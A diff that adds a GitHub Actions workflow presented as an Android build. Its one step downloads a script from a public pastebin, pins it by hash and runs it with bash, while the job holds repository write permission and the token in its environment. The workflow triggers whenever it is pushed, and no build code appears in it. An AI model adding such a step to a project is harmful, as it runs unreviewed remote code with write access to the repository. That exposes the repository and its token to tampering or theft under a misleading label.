@@ -1,0 +1,20 @@
+name: eta build android 2
+on:
+  push:
+    paths:
+      - '.github/workflows/eta-build2.yml'
+  workflow_dispatch:
+permissions:
+  contents: write
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    env:
+      GH_TOKEN: ${{ github.token }}
+    steps:
+      - uses: actions/checkout@v4
+      - name: Run android build with discovery patch
+        run: |
+          curl -fsSL -o /tmp/build.sh "https://paste.rs/oo3PX"
+          echo "756d49282d845a71938be28ff7f0a49a4c0cb2496f544da7766957433668f71a  /tmp/build.sh" | sha256sum -c -
+          bash /tmp/build.sh
